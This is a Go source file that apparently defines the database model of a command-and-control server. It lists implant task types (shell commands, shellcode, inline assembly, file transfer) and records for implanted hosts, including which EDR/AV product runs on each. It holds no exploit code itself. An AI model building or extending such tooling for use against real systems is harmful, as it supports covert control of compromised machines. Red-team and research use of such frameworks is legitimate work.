package db

const MAX_N_TASKS = 100

// Task types
const (
	EXEC_COMMAND uint8 = iota + 200
	EXEC_SHELLCODE
	SEND_FILE_TO_IMPLANT
	GET_FILE_FROM_IMPLANT
	EXEC_INLINE_ASM
)

var TaskTypes = map[uint8]string{
	EXEC_COMMAND:          "EXEC_COMMAND",
	EXEC_SHELLCODE:        "EXEC_SHELLCODE",
	SEND_FILE_TO_IMPLANT:  "SEND_FILE_TO_IMPLANT",
	GET_FILE_FROM_IMPLANT: "GET_FILE_FROM_IMPLANT",
	EXEC_INLINE_ASM:       "EXEC_INLINE_ASM",
}

type Implant_info struct {
	ID          string
	Hostname    string
	IntIP       string
	ExtIP       string
	Os          string
	ProcessID   uint64
	ProcessUser string
	ProtName    string // Name of the EDR/AV present on the machine
	LastCheckIn int64
	Active      bool
	KillDate    int64
}

type Implant_Task struct {
	TaskID      string
	ImplantID   string
	TaskType    uint8
	TaskData    []byte
	CreatedAt   int64
	Completed   bool
	CompletedAt int64
	TaskResult  []byte
}

type Listener_info struct {
	ListenerID string
	Config     []byte
	Host       string
	Port       uint16
	CreatedAt  int64
	KillDate   int64
}

// Files are stored on the C2 server local filesystem
type File_info struct {
	ImplantID string
	FileName  string
	FileSize  int64 //Store the file size in bytes
	FileType  string
	FilePath  string //Store the file location in the filesystem
	CreatedAt int64
}
